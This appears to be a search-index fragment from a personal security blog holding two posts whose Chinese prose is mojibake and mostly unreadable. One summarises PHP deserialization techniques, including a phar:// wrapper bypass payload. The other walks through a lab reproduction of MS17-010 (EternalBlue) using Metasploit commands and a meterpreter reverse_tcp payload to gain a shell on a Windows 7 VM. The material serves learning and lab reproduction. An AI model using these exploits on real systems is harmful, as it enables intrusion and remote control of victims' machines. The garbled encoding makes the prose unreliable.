itee.io/2021/01/15/ååºåˆ—åŒ–/","excerpt":"","text":"ååºåˆ—åŒ–æ€»ç»“(æŒç»­æ›´æ–°)å¸¸è§é­”æ³•å‡½æ•° __construct() __destruct() __get() __set() __isset() __unset() __sleep() __wakeup() åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨urlencode()è¿›è¡Œç¼–ç ï¼Œå› ä¸ºå­—ç¬¦ä¸²å«æœ‰ä¸å¯è§å­—ç¬¦%00 å¦‚: protected :%00*%00 å°æŠ€å·§__wakeup()ç»•è¿‡(CVE-2016-7124) å­˜åœ¨æ¼æ´çš„PHPç‰ˆæœ¬: PHP5.6.25ä¹‹å‰ç‰ˆæœ¬å’Œ7.0.10ä¹‹å‰çš„7.xç‰ˆæœ¬ã€‚ æ¼æ´æ¦‚è¿°: __wakeup()é­”æ³•å‡½æ•°è¢«ç»•è¿‡,å¯¼è‡´æ‰§è¡Œäº†ä¸€äº›éé¢„æœŸæ•ˆæœçš„æ¼æ´ã€‚ æ¼æ´åŸç†: å½“å¯¹è±¡çš„å±æ€§(å˜é‡)æ•°å¤§äºå®é™…çš„ä¸ªæ•°æ—¶,__wakeup()é­”æ³•å‡½æ•°è¢«ç»•è¿‡ ç›¸å…³é¢˜ç›®: phar ååºåˆ—åŒ–æœ€åˆæ˜¯åœ¨ Black Hat ä¸Šå®‰å…¨ç ”ç©¶å‘˜ Same Thomas åˆ†äº«çš„è®®é¢˜.phar ååºåˆ—åŒ–æ¼æ´,åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataè¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ åˆ©ç”¨æ¡ä»¶ phar æ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°å‚æ•°å¯æ§, : ,/ phar ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€è·³æ¿â€ã€‚ bypass phar:// ä¸èƒ½å‡ºç°åœ¨é¦–éƒ¨è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨compress.zlib:// æˆ–compress.bzip2://å‡½æ•°,compress.zlib://å’Œcompress.bzip2://åŒæ ·é€‚ç”¨äºphar://ã€‚ payload: compress.zlib://phar://phar.phar/test.txt Postgresql &lt;?php $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;)); $pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;); pgsqlCopyToFileå’Œpg_traceåŒæ ·ä¹Ÿæ˜¯èƒ½ä½¿ç”¨çš„ï¼Œåªæ˜¯å®ƒä»¬éœ€è¦å¼€å¯pharçš„å†™åŠŸèƒ½ã€‚ MySQL LOAD DATA LOCAL INFILEä¹Ÿä¼šè§¦å‘è¿™ä¸ªphp_stream_open_wrapper. ä½†æ˜¯éœ€è¦ä¿®æ”¹mysqldé…ç½®,å› ä¸ºä¸æ˜¯é»˜è®¤é…ç½®ã€‚ [mysqld] local-infile=1 secure_file_priv=&quot;&quot; ### å­—ç¬¦ä¸²é€ƒé€¸ï¼šå‡ºè‡ªæ¼æ´ï¼ˆCVE-2015-8562)ï¼Œè¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯åœ¨äºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ•°æ®æ²¡æœ‰è¢«è¿‡æ»¤å‡½æ•°æ­£ç¡®å¤„ç†,æœ€ç»ˆååºåˆ—åŒ–(ç›®å‰æˆ‘è®¤ä¸ºæ˜¯å› ä¸ºå…ˆè¿›è¡Œåºåˆ—åŒ–,ç„¶ååˆä½¿ç”¨å‡½æ•°æ›¿æ¢äº†å±é™©å‡½æ•°,å¯¼è‡´é•¿åº¦æ”¹å˜) ç›¸å…³é¢˜ç›®ï¼š0CTF 2016 piapiapia php session ååºåˆ—åŒ–é¦–å…ˆè¦çŸ¥é“äº†æ˜¯PHP session çš„å¼•æ“çš„å·®å¼‚, è¿™ä¹Ÿæ˜¯å¯¼è‡´è¿™ä¸ªæ¼æ´çš„æ ¹æœ¬åŸå› å’Œåˆ©ç”¨æ¡ä»¶ã€‚ session çš„å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ inset(â€˜session.save.handlerâ€™,â€™phpâ€™) session_star()è®¿é—®é¡µé¢æ—¶ç»™ç”¨æˆ·ä¸€ä¸ªsession session_nameè®¾ç½®å¯¹è¯åç§° session.save_path è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„session.save_handler è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°session.auto_start æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯session.serialize_handler å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php php é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ï¼‹é”®åï¼‹ç»è¿‡serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serialize serialize()å‡½æ•°ååºåˆ—å¤„ç†æ•°ç»„æ–¹å¼ å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionå†…å®¹æ˜¯ä»¥æ–‡ä»¶æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±session.save_handleræ¥å†³å®šã€‚æ–‡ä»¶åç”±sess_sessionidå‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸ºsessionåºåˆ—åŒ–åçš„å€¼ ä½†æ˜¯æ€ä¹ˆåšéƒ½åšä¸å‡ºæ¥http://web.jarvisoj.com:32784/ï¼Œç•™ä¸‹ç–‘é—®å§ https://www.cnblogs.com/zzjdbk/p/12995217.html å‚è€ƒé“¾æ¥ï¼šhttps://mp.weixin.qq.com/s?src=11&amp;timestamp=1610679686&amp;ver=2829&amp;signature=dT0Rm6Vl*xDBsXJDQcytMIXDsbCia30-qhuAUhC4TUMrJHsedOZ9ArYnY7F7WfBnOWvpqM47eM1Fdc4TD7F0zWAVsY6Zax6E6E3EBh7IhNwaT**2QChuJRQm3ZeDc3LT&amp;new=1 sessionæ€»ç»“ï¼šhttps://mp.weixin.qq.com/s?src=11&amp;timestamp=1610717650&amp;ver=2830&amp;signature=1Eb6Rxd4Q*bj8pVJuld6tPPVxVajsBIgOBRm8jjb4FVHuV332Gkv7Q3Ocm2kwEbV3cQ0qRILLhO0oPJUrg*zuO9D70-Q6fOcyEtciST4OcT8AXLcFXUhIcbZSengWFvf&amp;new=1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://pp1ove.gitee.io/tags/æ€»ç»“/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"MS17-010æ¼æ´çš„å¤ç°","slug":"ms17-010","date":"2021-01-14T06:17:47.000Z","updated":"2021-01-14T06:19:03.238Z","comments":false,"path":"2021/01/14/ms17-010/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/14/ms17-010/","excerpt":"","text":"MS17010 (æ°¸æ’ä¹‹è“)æ¼æ´æ¦‚è¿°:æ°¸æ’ä¹‹è“æ¼æ´æ˜¯åˆ©ç”¨æ¡†æ¶ä¸­ä¸€ä¸ªé’ˆå¯¹SMBæœåŠ¡(445ç«¯å£ï¼Œä¸»è¦ç”¨äºè¿æ¥unixç³»åˆ—ç³»ç»Ÿå’Œwindows)è¿›è¡Œæ”»å‡»çš„æ¼æ´ï¼Œè¯¥æ¼æ´å¯¼è‡´æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´åŸç†ï¼šMS17-010æ¼æ´å‡ºç°åœ¨çš„åŸå› æ˜¯SrvOs2FeaListSizeToNtåœ¨è®¡ç®—éœ€è¦åˆ†é…çš„å†…å­˜é•¿åº¦æ—¶å­˜åœ¨é—®é¢˜ï¼Œä»¥è‡³äºå¯ä»¥æº¢å‡ºåˆ°é‚»è¿‘çš„å†…å­˜å—ï¼Œæ”»å‡»è€…å‘ Windows SMBv1 æœåŠ¡å™¨å‘é€ç‰¹æ®Šè®¾è®¡çš„æ¶ˆæ¯ï¼Œå¯ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ ç¯å¢ƒæ­å»ºï¼škailï¼š192.168.182.130 win7ï¼š192.168.182.128 æ³¨æ„äº‹é¡¹ï¼šwin7éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š å…³é—­é˜²ç«è¯· å¼€å¯è¿œç¨‹æœåŠ¡ kailä¸win7ç›¸äº’pingé€š å¼€å¯445ç«¯å£ æ¼æ´åˆ©ç”¨***æ‰«æsacnneré¦–å…ˆæ‰“å¼€msfï¼Œå‘½ä»¤è¡Œè¾“å…¥msfconsoleï¼Œ //æ³¨æ„ï¼Œå½“ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶éœ€è¦è¿æ¥æ•°æ®åº“ ç„¶åsearch MS17-010 msf &gt; use auxiliary/scanner/smb/smb_ms17_010 //é€‰æ‹©éœ€è¦ä½¿ç”¨çš„æ¨¡å— msf &gt; show options //æŸ¥çœ‹å¯è®¾ç½®é€‰é¡¹ msf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.182.128 //è®¾ç½®ipæˆ–IPæ®µ msf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; exploit //æ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ ***æ”»å‡»exploitmsf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; back //è¿”å› å¯ä»¥ä½¿ç”¨è°·æ­Œè¯­æ³•æŸ¥æ‰¾åˆ°æ‰€éœ€è¦çš„æ¨¡å— search type:exploit name:ms17 é€‰æ‹©æ¨¡å— msf &gt; show options //æŸ¥çœ‹å¯è®¾ç½®é€‰é¡¹ msf &gt; auxiliary(smb_ms17_010) &gt; set RHOSTS 192.168.182.130 //è®¾ç½®ip ***Payloadæ¨¡å—show payloads //é€‰æ‹©æ‰€éœ€è¦çš„payload set payload windows/x64/meterpreter/reverse_tcp //é€‰æ‹©payload options //æŸ¥çœ‹é€‰é¡¹ set lport 445 //è®¾ç½®ç«¯å£å· set lhost 192.168.182.130 //è®¾ç½®ä¸»æœºçš„IP optionsæŸ¥çœ‹è®¾ç½®ï¼š å…³é”®çš„è®¾ç½®æ— è¯¯åå¼€å§‹æ”»å‡» ï¼ˆrhostï¼Œlhostï¼Œrportï¼Œlportï¼‰ è·å–shellï¼š åˆ›å»ºç”¨æˆ·ï¼š æ¼æ´ä¿®å¤ï¼š ä¸ºè®¡ç®—æœºå®‰è£…æœ€æ–°çš„å®‰å…¨è¡¥ä¸ï¼Œå¾®è½¯å·²å‘å¸ƒè¡¥ä¸MS17-010ä¿®å¤äº†â€œæ°¸æ’ä¹‹è“â€æ”»å‡»çš„ç³»ç»Ÿæ¼æ´ã€‚ å…³é—­445ã€135ã€137ã€138ã€139ç«¯å£ï¼Œå…³é—­ç½‘ç»œå…±äº«ã€‚ \\","categories":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pp1ove.gitee.io/categories/å¤ç°/"}],"tags":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://pp1ove.gitee.io/tags/æ¼æ´å¤ç°/"}],"keywords":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pp1ove.gitee.io/categories/å¤ç°/"}]}]}